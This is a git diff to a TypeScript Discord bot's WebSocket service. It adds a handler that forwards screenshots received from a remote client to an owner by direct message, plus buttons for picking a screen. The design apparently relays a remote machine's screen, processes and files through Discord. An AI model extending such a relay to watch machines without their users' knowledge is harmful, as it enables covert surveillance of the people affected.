@@ -2,7 +2,7 @@ import type { DiscordClient } from "@/clients/DiscordClient";
 import { Logger } from "@/shared/Logger";
 import { type FileMulter } from "@/types/Multer";
 import { io, Manager, type Socket } from "socket.io-client";
-import { AttachmentBuilder } from "discord.js";
+import { ActionRowBuilder, AttachmentBuilder, ButtonBuilder, ButtonStyle } from "discord.js";
 import { type FileMulterWs, type Process } from "@/types/Ws";
 import { fromBytesToMB } from "@/utils";
 
@@ -104,6 +104,30 @@ export default class WsService {
 		});
 
 		ws.on(
+			"sendScreenshotToBot",
+			async (data: { controllerid: string; screenshot: ArrayBuffer }) => {
+				const { controllerid, screenshot } = data;
+				const owner = await client.users.fetch(controllerid);
+
+				// console.log("Screenshot received", screenshot, controllerid);
+
+				if (owner) {
+					const attachment = new AttachmentBuilder(Buffer.from(screenshot), {
+						name: "screenshot.png"
+					});
+
+					await owner.send({
+						// content: `Screenshot from: ${controllerid}`,
+						files: [attachment]
+					});
+					Logger.info(`Screenshot sent to owner with ID: ${controllerid}`);
+				} else {
+					Logger.warn(`Owner not found for ID: ${controllerid}`);
+				}
+			}
+		);
+
+		ws.on(
 			"sendScreensToBot",
 			async (data: {
 				controllerid: string;
@@ -120,7 +144,29 @@ export default class WsService {
 
 				const owner = await client.users.fetch(controllerid);
 
-				// TODO
+				const buttons = screens.map((screen, idx) => {
+					const button = new ButtonBuilder()
+						.setCustomId(`screen-${screen.id}`)
+						.setLabel(`Screen ${idx + 1}`)
+						.setStyle(ButtonStyle.Secondary);
+					return button;
+				});
+
+				// const confirm = new ButtonBuilder()
+				// 	.setCustomId("confirm")
+				// 	.setLabel("Confirm Ban")
+				// 	.setStyle(ButtonStyle.Danger);
+				// const cancel = new ButtonBuilder()
+				// 	.setCustomId("cancel")
+				// 	.setLabel("Cancel")
+				// 	.setStyle(ButtonStyle.Secondary);
+
+				const row = new ActionRowBuilder<ButtonBuilder>().addComponents(buttons);
+
+				await owner.send({
+					content: `Select a screen`,
+					components: [row]
+				});
 			}
 		);
 
